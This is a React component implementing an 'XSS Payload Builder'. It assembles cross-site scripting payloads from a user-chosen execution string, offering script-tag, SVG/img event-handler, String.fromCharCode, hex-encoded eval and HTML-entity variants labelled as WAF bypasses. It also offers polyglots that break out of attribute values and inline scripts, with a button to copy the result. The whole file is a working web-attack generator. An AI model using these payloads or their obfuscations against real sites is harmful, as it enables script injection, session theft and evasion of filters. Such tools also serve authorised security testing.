"use client";

import React, { useState, useEffect } from "react";

type PayloadCategory = "bypass" | "polyglot";
type BypassMethod = "standard" | "no-script" | "string-from-char" | "hex-encode" | "html-entity";
type PolyglotContext = "universal" | "attribute" | "dom-inline";

export default function XssGeneratorVertical() {
    const [activeTab, setActiveTab] = useState<PayloadCategory>("bypass");
    const [alertText, setAlertText] = useState("1");

    // Config State
    const [bypassMethod, setBypassMethod] = useState<BypassMethod>("standard");
    const [polyglotContext, setPolyglotContext] = useState<PolyglotContext>("universal");

    const [finalPayload, setFinalPayload] = useState("");

    useEffect(() => {
        const cleanAlert = alertText.replace(/['"`]/g, "");
        let result = "";

        if (activeTab === "bypass") {
            switch (bypassMethod) {
                case "standard":
                    result = `<script>alert('${cleanAlert}')</script>`;
                    break;
                case "no-script":
                    result = `<svg onload="alert('${cleanAlert}')">`;
                    break;
                case "string-from-char":
                    const charCodes = Array.from(cleanAlert).map(ch => ch.charCodeAt(0)).join(",");
                    result = `<img src=x onerror="alert(String.fromCharCode(${charCodes}))">`;
                    break;
                case "hex-encode":
                    const hexEncoded = Array.from(`alert('${cleanAlert}')`)
                        .map(ch => `\\x${ch.charCodeAt(0).toString(16).padStart(2, "0")}`)
                        .join("");
                    result = `<svg><script>eval("${hexEncoded}")</script></svg>`;
                    break;
                case "html-entity":
                    result = `<body onload="&#x61;&#x6c;&#x65;&#x72;&#x74;('${cleanAlert}')">`;
                    break;
            }
        } else {
            switch (polyglotContext) {
                case "universal":
                    result = `javascript:/*-->\n</script></title></textarea>\n<svg/onload='+/"/+/alert(${cleanAlert})/*\x60'>`;
                    break;
                case "attribute":
                    result = `" autofocus onfocus="alert(${cleanAlert})` + "`";
                    break;
                case "dom-inline":
                    result = `}; alert(${cleanAlert}); // \n//-->`;
                    break;
            }
        }

        setFinalPayload(result);
    }, [alertText, activeTab, bypassMethod, polyglotContext]);

    return (
        <div className="max-w-3xl mx-auto p-5 bg-gray-950 border border-white/10 rounded-xl text-gray-200 font-sans">
            {/* Header */}
            <div className="border-b border-white/5 pb-4 mb-4">
                <h2 className="text-xl font-bold text-white tracking-tight">XSS Payload Builder</h2>
                <p className="text-xs text-gray-400 mt-0.5">Generate and obfuscate cross-site scripting vectors sequentially.</p>
            </div>

            {/* Step 1: Mode Selection (Tabs) */}
            <div className="space-y-1.5 mb-4">
                <label className="text-[10px] font-bold text-gray-400 uppercase tracking-wider">1. Engine Mode</label>
                <div className="grid grid-cols-2 gap-2 p-1 bg-gray-900 rounded-lg border border-white/5">
                    <button
                        onClick={() => setActiveTab("bypass")}
                        className={`py-2 text-xs font-bold rounded-md transition-all ${activeTab === "bypass" ? "bg-white/10 text-red-400 border border-white/5" : "text-gray-500"}`}
                    >
                        WAF Bypass & Obfuscator
                    </button>
                    <button
                        onClick={() => setActiveTab("polyglot")}
                        className={`py-2 text-xs font-bold rounded-md transition-all ${activeTab === "polyglot" ? "bg-white/10 text-red-400 border border-white/5" : "text-gray-500"}`}
                    >
                        Multi-Context Polyglot
                    </button>
                </div>
            </div>

            {/* Step 2: Parameters (Dinamis sesuai Tab) */}
            <div className="p-4 bg-gray-900 rounded-lg border border-white/5 space-y-4 mb-4">
                <span className="text-[10px] font-bold text-gray-400 uppercase tracking-wider block">2. Tweak Parameters</span>

                {/* Global Input */}
                <div className="space-y-1">
                    <label className="text-[10px] text-gray-400 font-bold">Execution Function / String</label>
                    <input
                        type="text"
                        value={alertText}
                        onChange={(e) => setAlertText(e.target.value)}
                        placeholder="e.g. document.domain"
                        className="w-full p-2 bg-gray-950 border border-white/10 rounded text-xs font-mono text-gray-300 focus:outline-none focus:border-red-500/50"
                    />
                </div>

                {/* Dropdown dinamis */}
                {activeTab === "bypass" ? (
                    <div className="space-y-1">
                        <label className="text-[10px] text-gray-400 font-bold">Obfuscation Strategy</label>
                        <select
                            value={bypassMethod}
                            onChange={(e) => setBypassMethod(e.target.value as BypassMethod)}
                            className="w-full p-2 bg-gray-950 border border-white/10 rounded text-xs font-bold text-gray-300 focus:outline-none"
                        >
                            <option value="standard">Standard Execution (&lt;script&gt;)</option>
                            <option value="no-script">Filter Bypass / No Script Tag (SVG/Img)</option>
                            <option value="string-from-char">Quote Bypass (String.fromCharCode)</option>
                            <option value="hex-encode">Hex Obfuscation (eval/\\xHex)</option>
                            <option value="html-entity">Decimal HTML Entities</option>
                        </select>
                    </div>
                ) : (
                    <div className="space-y-1">
                        <label className="text-[10px] text-gray-400 font-bold">Target Breakdown Context</label>
                        <select
                            value={polyglotContext}
                            onChange={(e) => setPolyglotContext(e.target.value as PolyglotContext)}
                            className="w-full p-2 bg-gray-950 border border-white/10 rounded text-xs font-bold text-gray-300 focus:outline-none"
                        >
                            <option value="universal">Universal Polyglot (Multi-Context Execution)</option>
                            <option value="attribute">Attribute Breaker (Break out of value="")</option>
                            <option value="dom-inline">Inline Script Escape (Break out of blocks)</option>
                        </select>
                    </div>
                )}
            </div>

            {/* Step 3: Single Output Terminal */}
            <div className="space-y-1.5">
                <div className="flex justify-between items-center">
                    <label className="text-[10px] font-bold text-gray-400 uppercase tracking-wider">3. Compiled Vector Output</label>
                    <button
                        onClick={() => navigator.clipboard.writeText(finalPayload)}
                        className="text-[10px] font-bold text-red-400 hover:underline bg-transparent"
                    >
                        [Copy Payload]
                    </button>
                </div>
                <div className="relative">
                    <textarea
                        readOnly
                        value={finalPayload}
                        rows={4}
                        className={`w-full p-3 bg-gray-900 border border-white/10 rounded-lg text-xs font-mono focus:outline-none resize-none ${activeTab === "bypass" ? "text-red-400" : "text-red-400"}`}
                    />
                </div>
            </div>
        </div>
    );
}